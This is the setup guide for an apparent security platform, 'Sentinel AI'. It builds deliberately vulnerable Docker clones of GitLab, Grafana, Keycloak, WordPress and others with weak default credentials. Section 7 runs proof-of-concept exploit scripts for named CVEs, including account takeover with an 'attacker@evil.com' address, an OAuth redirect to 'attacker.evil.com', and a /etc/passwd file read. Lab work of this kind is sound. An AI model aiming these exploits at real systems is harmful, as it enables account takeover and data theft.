# Sentinel AI — Setup & Installation Guide

> Full setup for: Frontend · Backend · Company Infrastructure Clones · Exploit Lab

---

## Quick Start (TL;DR)

```bash
# 1. Clone and enter the project
git clone <repo-url> sentinelai && cd sentinelai

# 2. Copy and fill environment variables
cp backend/.env.example backend/.env
# → edit backend/.env with your API keys (see Section 3)

# 3. Start everything
chmod +x start.sh
./start.sh
```

Open → **http://localhost:3000**

---

## Table of Contents

1. [System Requirements](#1-system-requirements)
2. [Project Structure](#2-project-structure)
3. [Environment Variables](#3-environment-variables)
4. [Backend Setup](#4-backend-setup)
5. [Frontend Setup](#5-frontend-setup)
6. [Company Infrastructure Clones](#6-company-infrastructure-clones)
7. [Running Exploit Scripts](#7-running-exploit-scripts)
8. [Database Setup (Supabase)](#8-database-setup-supabase)
9. [Start Script Reference](#9-start-script-reference)
10. [Service URLs Reference](#10-service-urls-reference)
11. [Troubleshooting](#11-troubleshooting)

---

## 1. System Requirements

### Required

| Tool | Version | Install |
|---|---|---|
| **Node.js** | >= 20.x LTS | https://nodejs.org or `nvm install 20` |
| **npm** | >= 10.x | Ships with Node.js |
| **Docker** | >= 24.x | https://docs.docker.com/get-docker/ |
| **Docker Compose** | >= 2.x | Included in Docker Desktop |
| **Git** | any | https://git-scm.com |

### Optional (for exploit scripts)

| Tool | Purpose | Install |
|---|---|---|
| **Python 3.10+** | Exploit scripts | https://python.org |
| **psycopg2** | PostgreSQL exploit | `pip install psycopg2-binary` |
| **requests** | All Python tools | `pip install requests` |

### Verify installations

```bash
node --version      # v20.x.x or higher
npm --version       # 10.x.x or higher
docker --version    # Docker version 24.x or higher
docker compose version  # Docker Compose version v2.x
python3 --version   # Python 3.10+ (optional)
```

---

## 2. Project Structure

```
sentinelai/
├── start.sh                    ← ONE-COMMAND launcher (start everything)
├── SETUP.md                    ← This file
├── backend/                    ← Fastify API server (port 8000)
│   ├── src/
│   │   ├── server.ts           ← Entry point
│   │   ├── routes/             ← All API routes
│   │   │   ├── infra-scan.ts   ← Company infra scanner
│   │   │   ├── dashboard.ts    ← KPIs, compliance, activity
│   │   │   ├── vulnerabilities.ts
│   │   │   ├── patches.ts
│   │   │   └── ...
│   │   ├── intel/              ← NVD, EPSS, KEV, MITRE, VulDB
│   │   ├── ai/                 ← Claude API integration
│   │   └── simulation/         ← Exploit sandbox engine
│   ├── .env                    ← ← ← PUT YOUR KEYS HERE
│   └── package.json
├── frontend/                   ← Next.js 14 UI (port 3000)
│   ├── app/(dashboard)/        ← All pages
│   │   ├── page.tsx            ← Dashboard
│   │   ├── infra-scan/         ← Infrastructure Scanner ← NEW
│   │   ├── vulnerabilities/
│   │   ├── exploit-lab/
│   │   ├── attack-graph/
│   │   ├── compliance/
│   │   ├── patch-automation/
│   │   └── threat-intelligence/
│   ├── .env.local              ← Frontend env (API URL)
│   └── package.json
├── containers/docker/
│   └── docker-compose.yml      ← All containers including company-infra
├── exploit-files/
│   └── tools/
│       ├── gitlab/             ← CVE-2023-7028 PoC
│       ├── grafana/            ← CVE-2021-43798 PoC
│       ├── keycloak/           ← CVE-2024-1132 PoC
│       ├── wordpress/          ← WP enum + CVE detection
│       ├── postgresql/         ← Auth check + CVE-2024-0985
│       ├── erpnext/            ← CVE-2024-25136 SQL injection
│       └── prometheus/         ← CVE-2019-3826 XSS + exposure
├── database/
│   ├── schema.sql              ← Full Supabase schema
│   └── seeds/                  ← Dev seed data
└── docs/                       ← Architecture docs
```

---

## 3. Environment Variables

### Backend (`backend/.env`)

Copy the example and fill in your values:

```bash
cp backend/.env.example backend/.env
nano backend/.env   # or code backend/.env
```

**Required keys:**

```bash
# ── Core ──────────────────────────────────────────────────
NODE_ENV=development
BACKEND_PORT=8000
BACKEND_CORS_ORIGINS=http://localhost:3000

# ── Supabase (get from supabase.com → Project Settings → API) ──
SUPABASE_URL=https://your-project.supabase.co
SUPABASE_SERVICE_ROLE_KEY=eyJhbGciOiJIUzI1...   # Service role (secret)
DATABASE_URL=postgresql://postgres:password@db.xxx.supabase.co:5432/postgres

# ── AI Layer (get from console.anthropic.com) ──────────────
ANTHROPIC_API_KEY=sk-ant-api03-...

# ── Threat Intelligence (optional, raises rate limits) ─────
NVD_API_KEY=your-nvd-key        # https://nvd.nist.gov/developers/request-an-api-key
VULDB_API_KEY=your-vuldb-key    # https://vuldb.com/?kb.api

# ── GitHub Integration (optional) ─────────────────────────
GITHUB_TOKEN=ghp_...            # Personal access token
GITHUB_WEBHOOK_SECRET=...

# ── Cloudflare Integration (optional) ─────────────────────
CLOUDFLARE_TOKEN=...

# ── Redis (optional — uses in-memory cache if not set) ─────
REDIS_URL=redis://localhost:6379
```

**Getting API keys:**

| Key | Where to get | Free tier |
|---|---|---|
| `SUPABASE_URL` + `SUPABASE_SERVICE_ROLE_KEY` | [supabase.com](https://supabase.com) → New Project → Settings → API | Yes (500MB DB) |
| `ANTHROPIC_API_KEY` | [console.anthropic.com](https://console.anthropic.com) → API Keys | $5 free credits |
| `NVD_API_KEY` | [nvd.nist.gov/developers](https://nvd.nist.gov/developers/request-an-api-key) | Free |
| `VULDB_API_KEY` | [vuldb.com](https://vuldb.com) → Register | 50 req/day free |

### Frontend (`frontend/.env.local`)

Already configured to connect to local backend. Only change if deploying remotely:

```bash
NEXT_PUBLIC_API_URL=http://localhost:8000
NEXT_PUBLIC_APP_URL=http://localhost:3000
NEXT_PUBLIC_APP_NAME=Sentinel AI

# Optional — for Supabase Auth (if adding login)
NEXT_PUBLIC_SUPABASE_URL=https://your-project.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1...
```

---

## 4. Backend Setup

```bash
cd backend

# Install dependencies
npm install

# Build TypeScript
npm run build

# Start (development — auto-restart on changes)
npm run dev

# Start (production — from compiled JS)
node dist/server.js
```

**Verify backend:**
```bash
curl http://localhost:8000/health
# Expected: {"status":"ok","ts":"...","version":"0.2.0","services":{...}}
```

---

## 5. Frontend Setup

```bash
cd frontend

# Install dependencies
npm install

# Development server (with hot reload)
npm run dev

# Production build
npm run build
npm run start
```

**Verify frontend:** open http://localhost:3000

---

## 6. Company Infrastructure Clones

These are intentionally vulnerable versions of the company stack for exploit simulation.

### Start all 7 services

```bash
cd containers/docker
docker compose --profile company-infra up -d
```

### Services started

| Service | Image | Port | Admin Credentials |
|---|---|---|---|
| **GitLab** | `gitlab/gitlab-ce:16.0.0-ce.0` | 8200 | root / SentinelDemo123! |
| **WordPress** | `wordpress:6.1.0` | 8201 | admin / SentinelDemo123! |
| **ERPNext** | `frappe/erpnext:latest` | 8202 | Administrator / admin |
| **Keycloak** | `keycloak/keycloak:23.0.0` | 8203 | admin / SentinelDemo123! |
| **PostgreSQL** | `postgres:15.0` | 8204 | postgres / postgres |
| **Grafana** | `grafana/grafana:8.3.0` | 8205 | admin / admin |
| **Prometheus** | `prom/prometheus:v2.5.0` | 8206 | none (open) |

### First-boot notes

- **GitLab**: Takes 3–5 minutes to initialize on first start. Check with:
  ```bash
  docker logs -f sentinel-gitlab | grep "gitlab Reconfigured"
  ```
- **ERPNext**: Takes 5–10 minutes. Initial setup requires running bench commands:
  ```bash
  docker exec sentinel-erpnext bench new-site erp.company.local --admin-password admin
  ```
- **WordPress**: WP setup wizard runs at http://localhost:8201/wp-admin/install.php on first boot.

### Stop all company-infra

```bash
cd containers/docker
docker compose --profile company-infra down
```

### Individual container control

```bash
# Start just Grafana
docker compose --profile company-infra up -d grafana-vuln

# View logs
docker logs -f sentinel-grafana-vuln

# Shell into container
docker exec -it sentinel-grafana-vuln /bin/bash
```

---

## 7. Running Exploit Scripts

All scripts in `exploit-files/tools/`. Install Python dependencies first:

```bash
pip install requests psycopg2-binary urllib3
```

### GitLab — CVE-2023-7028 (Account Takeover, CVSS 10.0)

```bash
python3 exploit-files/tools/gitlab/cve_2023_7028.py \
  --target http://localhost:8200 \
  --victim admin@company.local \
  --attacker attacker@evil.com \
  --enumerate
```

### Grafana — CVE-2021-43798 (Arbitrary File Read, CVSS 7.5 KEV)

```bash
# Read /etc/passwd
python3 exploit-files/tools/grafana/cve_2021_43798.py \
  --target http://localhost:8205

# Read a specific file
python3 exploit-files/tools/grafana/cve_2021_43798.py \
  --target http://localhost:8205 \
  --file /etc/grafana/grafana.ini
```

### Keycloak — CVE-2024-1132 (OAuth2 redirect_uri bypass, CVSS 8.1)

```bash
python3 exploit-files/tools/keycloak/cve_2024_1132.py \
  --target http://localhost:8203 \
  --realm master \
  --attacker-host http://attacker.evil.com
```

### WordPress — User Enumeration + Plugin CVEs

```bash
python3 exploit-files/tools/wordpress/wp_enum.py \
  --target http://localhost:8201 \
  --deep
```

### PostgreSQL — Auth Check + CVE-2024-0985

```bash
python3 exploit-files/tools/postgresql/pg_auth_check.py \
  --host localhost \
  --port 8204
```

### ERPNext — CVE-2024-25136 (SQL Injection, CVSS 9.1)

```bash
python3 exploit-files/tools/erpnext/cve_2024_25136.py \
  --target http://localhost:8202
```

### Prometheus — CVE-2019-3826 + Metrics Exposure

```bash
python3 exploit-files/tools/prometheus/cve_2019_3826.py \
  --target http://localhost:8206
```

---

## 8. Database Setup (Supabase)

### Option A — Use existing Supabase project

The project already connects to `lpivheudrpyzjqkegxww.supabase.co`. Just copy the `.env` from the team.

### Option B — New Supabase project

```bash
# 1. Go to https://supabase.com → New project

# 2. Apply the schema
psql "$DATABASE_URL" -f database/schema.sql

# 3. Apply threat-feed migration
psql "$DATABASE_URL" -f database/migrations/002-threat-feed.sql

# 4. (Optional) Load dev seed data
psql "$DATABASE_URL" -f database/seeds/dev-expanded.sql
```

### Sync live CVE data

Once backend is running:

```bash
# Sync all sources (NVD + KEV + VulDB)
curl -X POST http://localhost:8000/api/sync/all

# Or individually
curl -X POST http://localhost:8000/api/sync/nvd -H "Content-Type: application/json" \
  -d '{"hours_back": 72}'
curl -X POST http://localhost:8000/api/sync/kev -H "Content-Type: application/json" \
  -d '{"days_back": 30}'
```

---

## 9. Start Script Reference

```bash
# Start everything (backend + frontend + docker)
./start.sh

# Start only backend + frontend (skip Docker)
./start.sh --no-docker

# Stop all background processes
./start.sh --stop

# View logs
tail -f .logs/backend.log
tail -f .logs/frontend.log
docker logs -f sentinel-grafana-vuln
```

**What `start.sh` does:**
1. Checks prerequisites (Node >= 20, Docker)
2. Installs backend dependencies + builds TypeScript
3. Starts backend on port 8000 (background)
4. Waits for backend health check
5. Installs frontend dependencies
6. Starts frontend dev server on port 3000 (background)
7. Pulls and starts all Docker company-infra containers
8. Prints all service URLs

---

## 10. Service URLs Reference

| Service | URL | Notes |
|---|---|---|
| **Frontend UI** | http://localhost:3000 | Main dashboard |
| **Backend API** | http://localhost:8000 | REST API |
| **Backend Health** | http://localhost:8000/health | Status check |
| **Infra Scanner** | http://localhost:3000/infra-scan | Scanner UI |
| **Attack Graph** | http://localhost:3000/attack-graph | Graph UI |
| **Exploit Lab** | http://localhost:3000/exploit-lab | Simulation UI |
| — | — | — |
| **GitLab** | http://localhost:8200 | CVE-2023-7028 |
| **WordPress** | http://localhost:8201 | CVE-2024-6386 |
| **ERPNext** | http://localhost:8202 | CVE-2024-25136 |
| **Keycloak** | http://localhost:8203 | CVE-2024-1132 |
| **PostgreSQL** | localhost:8204 | CVE-2024-0985 |
| **Grafana** | http://localhost:8205 | CVE-2021-43798 |
| **Prometheus** | http://localhost:8206 | CVE-2019-3826 |

---

## 11. Troubleshooting

### Backend won't start

```bash
# Check logs
tail -100 .logs/backend.log

# Common causes:
# 1. Missing .env — copy backend/.env.example → backend/.env
# 2. Port 8000 in use — kill -9 $(lsof -ti:8000)
# 3. Build failed — cd backend && npm run build
```

### Frontend won't start

```bash
tail -100 .logs/frontend.log

# Common causes:
# 1. Port 3000 in use — kill -9 $(lsof -ti:3000)
# 2. Missing dependencies — cd frontend && npm install
# 3. Next.js config error — cd frontend && npm run build
```

### Docker containers won't start

```bash
# Check Docker daemon is running
docker info

# View specific container logs
docker logs sentinel-grafana-vuln
docker logs sentinel-keycloak

# Common: port conflict
sudo lsof -i :8205   # check who's using port 8205
```

### GitLab takes too long

GitLab CE is a heavy image (~2GB). On first boot it runs `gitlab-ctl reconfigure` which takes 3–5 minutes. Be patient:

```bash
docker logs -f sentinel-gitlab 2>&1 | grep -E "Reconfigured|Running|Error"
```

### ERPNext setup

ERPNext needs a site initialized on first run:

```bash
docker exec -it sentinel-erpnext bash -c \
  "bench new-site erp.company.local --mariadb-root-password root --admin-password admin"
```

### Supabase connection errors

```bash
# Test connection
psql "$DATABASE_URL" -c "SELECT 1"

# Check your SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY in backend/.env
```

### Port conflicts — kill all Sentinel processes

```bash
# Kill backend
kill -9 $(lsof -ti:8000) 2>/dev/null || true

# Kill frontend
kill -9 $(lsof -ti:3000) 2>/dev/null || true

# Or use the stop command
./start.sh --stop
```

---

## Security Notice

The company infrastructure clones (`company-infra` Docker profile) are **intentionally vulnerable** for security testing and demonstration purposes.

- **Never expose these containers on a public network**
- All containers run on the isolated `sentinel-sandbox` Docker network
- Use only for authorized security testing and demonstration
- Default credentials are weak by design (see Section 6)

---

*Sentinel AI — Built for security teams that move fast.*
